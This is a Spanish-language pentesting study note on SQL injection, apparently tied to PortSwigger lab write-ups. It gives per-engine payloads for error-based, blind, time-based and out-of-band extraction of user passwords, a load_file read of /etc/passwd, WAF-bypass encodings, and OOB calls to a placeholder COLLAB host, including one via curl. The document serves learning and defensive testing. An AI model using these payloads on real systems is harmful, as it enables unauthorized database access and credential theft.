# Análisis de Vulnerabilidades: SQL Injection (SQLi)

## Descripción
La inyección SQL (SQLi) ocurre cuando una aplicación web inserta datos de entrada no confiables directamente en una consulta SQL sin la debida sanitización o parametrización. Según *The Web Application Hacker's Handbook*, la explotación exitosa puede permitir la lectura de bases de datos completas, modificación de datos (U/I/D) y, en configuraciones débiles (ej. `xp_cmdshell` en MSSQL), la ejecución de comandos en el sistema operativo.

## Clasificación
- **Fase**: Análisis de Vulnerabilidades
- **MITRE ATT&CK**: [T1190](https://attack.mitre.org/techniques/T1190/) (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Avanzada

## Herramientas
- **SQLMap** — Estándar de la industria para automatizar la detección y explotación.
- **Burp Suite (Repeater/Intruder)** — Para validación manual y análisis de respuestas.
- **dbdat** — Herramienta de auditoría para bases de datos (Oracle, MSSQL).
- **SecLists** — Listas de payloads para fuzzing de parámetros.

## Comandos / Ejemplos

### Sondeo previo — numeric vs string SQLi

Antes de tirar payloads con keywords (`UNION`, `'`, `OR 1=1`), conviene saber **cómo se inserta el campo en la query**:

- **Numeric SQLi**: el campo se concatena sin comillas. `WHERE id=<VALOR>`. El valor se interpreta como expresión.
- **String SQLi**: el campo va entre comillas. `WHERE id='<VALOR>'`. Hay que cerrar la comilla antes de inyectar.

**Test aritmético** (sondeo más limpio para numeric, pasa por debajo de cualquier WAF basado en patrones):
- Si el valor original es `2`, mandar `3-1`. Si la respuesta es la misma → numeric SQLi confirmada (la DB evaluó la resta).
- Si la respuesta cambia o falla → o el campo está parametrizado, o es string SQLi. Pasar al test con `'`.

**Test de comilla** (clásico para detectar string):
- Mandar `xyz'`. Si rompe la sintaxis (error 500, mensaje raro, comportamiento distinto) → SQLi presente.

Con esa info ya sabes si necesitas `'` para cerrar el string o puedes inyectar directo después del número.

### 1. Inyección Basada en Error (Error-based)
Útil cuando el servidor devuelve mensajes de error detallados de la DB. La idea: forzar a la DB a evaluar una subquery cuyo resultado quede embebido en el mensaje de error como canal de exfiltración.

**Primitivo más limpio — error de conversión de tipo (`CAST`)**: una subquery devuelve texto, se fuerza su conversión a entero, la DB falla y vuelca el valor literal en el mensaje:

- **PostgreSQL / SQLite**: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
  - Error: `ERROR: invalid input syntax for type integer: "<valor>"`
- **MS SQL Server**: `' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--`
  - Error: `Conversion failed when converting the nvarchar value '<valor>' to data type int.`
- **Oracle**: `' AND 1=TO_NUMBER((SELECT password FROM users WHERE ROWNUM=1))--`
  - Error: `ORA-01722: invalid number`. Devuelve el valor en algunas versiones; en otras hay que usar `UTL_INADDR.GET_HOST_NAME` u otras funciones.
- **MySQL** (sin `CAST` directo a int por las buenas, técnica clásica con XPath): `' AND extractvalue(rand(),concat(0x3a,(SELECT password FROM users LIMIT 1)))--`
  - Error: `XPATH syntax error: ':<valor>'`.

**Variante con concatenación (`||`)** — útil cuando hay **límites de longitud** en el punto de inyección y no podemos pagar el coste de un `AND <cláusula>`. Se incrusta el `CAST` directamente dentro del string del `WHERE`:
- `'||CAST((SELECT password FROM users LIMIT 1)AS int)||'`
- Query resultante: `WHERE id = ''||CAST(...)||''` — comillas balanceadas, sin necesidad de `--`.
- Funciona en PostgreSQL/Oracle/SQLite (concat). En MySQL `||` es OR lógico por defecto, pero la subexpresión se evalúa igual y el cast sigue reventando.

**Variante clásica MySQL — error de duplicate key con `COUNT/GROUP BY/FLOOR(RAND())`** (cuando los CAST/extractvalue están filtrados):
- `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`

### 2. Inyección Ciega Basada en Booleano (Boolean-blind)
Cuando la aplicación solo cambia su respuesta (ej. "Bienvenido" vs "Login fallido").
- **Test**: `?id=1' AND 1=1--` (Verdadero) vs `?id=1' AND 1=2--` (Falso).
- **Inferencia**: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`

### 3. Inyección Ciega Basada en Tiempo (Time-blind)
Cuando ni los errores ni la respuesta booleana se reflejan, el único canal observable es el **tiempo de respuesta**. Se fuerza a la DB a dormir N segundos y se compara contra un baseline previo (mandar 3-4 requests limpias antes de inyectar para conocer el tiempo "rápido" — sin baseline no se distingue un retardo provocado de la latencia normal).

**Primitivos de retardo por motor**:

| Motor | Función / Sentencia | Notas |
|---|---|---|
| **PostgreSQL** | `SELECT pg_sleep(N)` | Bloqueante, sin permisos especiales |
| **MySQL / MariaDB** | `SELECT SLEEP(N)` | Igual que PostgreSQL |
| **MS SQL Server** | `WAITFOR DELAY '0:0:N'` | No es función — sentencia. No vale dentro de un `SELECT` |
| **Oracle** | `dbms_pipe.receive_message(('a'),N)` | Recibe en pipe inexistente y timeoutea a los N segundos. No hay `SLEEP` puro |
| **SQLite** | (sin función nativa) | Se simula con queries pesadas, ej. `randomblob(100000000)` o CTE recursiva |

**Tres formas de inyectar el sleep** (mismo motor, distinto vector según qué tolere el sink):

```sql
-- 1) Stacked queries (driver permite multi-statement). Sólo provoca el retardo, no extrae nada.
'; SELECT pg_sleep(10)--

-- 2) Concatenación (PostgreSQL/Oracle/SQLite). Útil con límite de longitud.
'||pg_sleep(10)--

-- 3) Cláusula AND (más universal). Funciona aunque stacked queries esté deshabilitado.
' AND pg_sleep(10)--
```

**Inferencia bit a bit** — para extraer datos por tiempo, hay que condicionar el sleep al valor leído. `CASE WHEN <condición> THEN sleep ELSE 0 END`:

- **PostgreSQL**: `'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin'--`
- **MySQL**: `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--`
- **MS SQL**: `'; IF (SELECT TOP 1 SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--`

Iterar carácter a carácter (preferiblemente con búsqueda binaria sobre el rango ASCII para reducir requests). Automatizable con `sqlmap --technique=T` o Burp Intruder con grep-time.

**⚠️ Gotcha — `;` en headers Cookie**: si el sink es una cookie, `;` es el delimitador de cookies en la cabecera. Un payload con `;` literal corta la cookie ahí y el resto nunca llega al backend. Hay que URL-encodearlo como `%3B` dentro del valor:

```
Cookie: TrackingId=x'%3BSELECT+pg_sleep(10)--
```

Burp Repeater no encodea automáticamente — escribirlo ya como `%3B`. Mismo cuidado con `,` en algunos parsers de cookies. En parámetros GET/POST normales el `;` no es delimitador y va literal.

### 4. Inyección Fuera de Banda (Out-of-Band / OAST)
Cuando ni los errores, ni el body, ni el tiempo de respuesta reflejan el resultado de la query (típico de queries async fire-and-forget), el último canal viable es **fuera de banda**: forzar a la DB a iniciar una conexión saliente (DNS lookup, HTTP request, SMB) hacia un host que controlamos. La interacción recibida en nuestro listener confirma la inyección, y según el motor permite además exfiltrar datos en el subdominio o el path.

**Primitivas OOB por motor**:

| Motor | Primitivo | Notas |
|---|---|---|
| **Oracle** | `EXTRACTVALUE(xmltype('<!DOCTYPE x [ <!ENTITY % p SYSTEM "http://COLLAB/"> %p; ]>'),'/l')` | XXE durante el parseo del `xmltype()`. No requiere permisos especiales; la primitiva más limpia |
| **Oracle** | `UTL_HTTP.REQUEST('http://COLLAB/')` o `UTL_INADDR.GET_HOST_ADDRESS('COLLAB')` o `DBMS_LDAP.INIT('COLLAB',389)` | Alternativas si XXE está bloqueado. Requieren permisos sobre estos packages |
| **MS SQL** | `EXEC master..xp_dirtree '\\COLLAB\share'` | UNC path → SMB/NetBIOS lookup. También `xp_fileexist`, `BULK INSERT FROM` |
| **MySQL** (Windows) | `LOAD_FILE('\\\\COLLAB\\share')` o `SELECT ... INTO OUTFILE '\\\\COLLAB\\…'` | Sólo en Windows (Linux no resuelve UNC). Requiere `FILE` privilege |
| **PostgreSQL** | `COPY (SELECT '') TO PROGRAM 'curl http://COLLAB/'` | Requiere superuser. Más práctico vía extensiones (`dblink`, `postgres_fdw`) |

**Ejemplo Oracle XXE completo** (el más usado en pentests reales y labs PortSwigger):

```sql
' UNION SELECT EXTRACTVALUE(xmltype(
  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB.oastify.com/"> %remote;]>'
), '/l') FROM dual--
```

La entidad `%remote` se resuelve durante el `xmltype()` — antes incluso de llegar a `EXTRACTVALUE`. El `EXTRACTVALUE` sólo está para que el `SELECT` sea sintácticamente válido.

**Receptor OOB (OAST)**:

| Herramienta | Dominio | Coste | Cuándo usarla |
|---|---|---|---|
| **Burp Collaborator** | `*.oastify.com` | Burp Pro | Pentesting profesional, labs PortSwigger Academy |
| **interactsh** | `*.oast.me`, `*.oast.fun`, etc. | Gratuito | CTF, bug bounty, entornos sin firewall restrictivo |
| **DNSLog** | `dnslog.cn` | Gratuito | Tests rápidos puntuales |
| **Servidor propio** | dominio propio | Variable | Cuando hay que evadir allowlists o auditar receptor |

**⚠️ Allowlists de OAST**: algunos entornos de prácticas/red teams sólo dejan salir hacia dominios específicos. PortSwigger Academy bloquea todo OOB hacia dominios distintos de `*.oastify.com` para evitar abuso. Verificar restricciones del target antes de invertir tiempo en debug — si el firewall corta la salida, ningún payload funcionará independientemente de su corrección sintáctica.

### 5. Lectura de Archivos Locales (load_file)
Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv` es nula:
- **MySQL**: `' UNION SELECT 1, load_file('/etc/passwd'), 3, 4--`

### 6. WAF Bypass — Encoding asimétrico

Un patrón recurrente: el **WAF inspecciona el body en wire format** (XML/JSON/multipart raw como string) buscando substrings tipo `UNION`, `SELECT`, `'`. Pero el **backend procesa el body parseado**, después de que el parser correspondiente decodee escapes y entidades. Esa asimetría es el bug: si codificamos las keywords en algún esquema que el WAF no aplica pero el parser sí, el payload pasa.

**Bypass por formato del body**:

| Formato | Esquema de encoding | Ejemplo (`UNION`) |
|---|---|---|
| **XML** | Hex/decimal entities `&#xHH;` / `&#NNN;` | `&#x55;NION` (sólo la `U`) o `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` (todo) |
| **JSON** | Unicode escapes `\uHHHH` | `"UNION SELECT"` |
| **HTML form** | URL-encoding `%HH` | `%55NION%20SELECT` (poco efectivo, los WAFs suelen URL-decodear antes) |
| **Multipart** | Encabezados `Content-Transfer-Encoding: base64`/`quoted-printable` | Body codificado, WAF que no decodea no ve el patrón |
| **gzip/deflate** | Compresión del body con `Content-Encoding: gzip` | Algunos WAFs no descomprimen antes de inspeccionar |

**Ejemplo XML — el más limpio en la práctica**:

```xml
<!-- WAF ve esto (sin coincidir con 'UNION SELECT'): -->
<storeId>1 &#x55;NION &#x53;ELECT username||&#x27;~&#x27;||password FROM users</storeId>

<!-- Backend recibe esto despues de parsear: -->
<!-- 1 UNION SELECT username||'~'||password FROM users -->
```

Sólo encodear **la primera letra** de cada keyword bloqueada es suficiente para romper el match exacto y mantiene el payload legible. Encodear la palabra entera funciona igual pero es más ruidoso.

**Otros bypasses comunes a nivel SQL** (no por encoding, sino por equivalencias semánticas):

- **Comentarios inline para romper el match**: `UN/**/ION SE/**/LECT` (MySQL, MariaDB).
- **Case alternation**: `UnIoN SeLeCt` cuando el WAF hace match case-sensitive (raro pero existe).
- **Whitespace alternativo**: `UNION%09SELECT` (tab), `UNION/**/SELECT` (comentario), `UNION%0aSELECT` (newline).
- **Equivalencias semánticas**: `||` en lugar de `OR` (PostgreSQL/Oracle/SQLite — concat, pero también permite `OR` en algunos contextos), `&&` en lugar de `AND` (MySQL).
- **Funciones equivalentes**: `MID()` en lugar de `SUBSTRING()`, `IIF()` en lugar de `CASE WHEN`.

> **Heurística**: si el WAF bloquea una keyword, lo primero que hay que probar es **encoding por formato del body** (XML/JSON entities). Si el body no permite encoding (texto plano, URL params), pasar a **comentarios inline** y **whitespace alternativo**. Si nada de eso pasa, probar **equivalencias semánticas**. Combinar varias técnicas a la vez suele bypassear hasta WAFs decentes.

## Contramedidas
- **Consultas Preparadas (Sentencias Parametrizadas)**: Única defensa 100% efectiva (ej. `PDO` en PHP, `PreparedStatement` en Java).
- **Principio de Mínimo Privilegio**: La cuenta de la DB de la web no debe ser `root` ni `sa`.
- **WAF (Web Application Firewall)**: Para detectar y bloquear patrones de inyección conocidos (defensa en profundidad).

## Referencias
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.
- Rahalkar, S. (2017). *Metasploit Penetration Testing Cookbook* (3rd ed.). Packt Publishing.
- OWASP Foundation. (2021). *SQL Injection Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy. (s.f.). *Blind SQL injection*. https://portswigger.net/web-security/sql-injection/blind
- Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del primitivo `CAST` en PostgreSQL leyendo `users.password` desde una cookie de tracking, incluyendo workaround con `||` ante límite de longitud.
- Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` vía stacked queries en cookie, incluyendo el detalle de URL-encodear el `;` como `%3B`.
- Writeup propio: [`learning/portswigger/blind-sqli-out-of-band/writeup.md`](../../../learning/portswigger/blind-sqli-out-of-band/writeup.md) — ejemplo de OOB en Oracle vía XXE en `xmltype()` + diagnóstico del bloqueo por allowlist de OAST en PortSwigger Academy (sólo `*.oastify.com`).
- Writeup propio: [`learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md`](../../../learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md) — ejemplo end-to-end de WAF bypass vía XML hex entities (`&#x55;NION`) sobre endpoint que recibe XML, incluyendo el sondeo aritmético `3-1` para confirmar numeric SQLi sin tocar keywords.
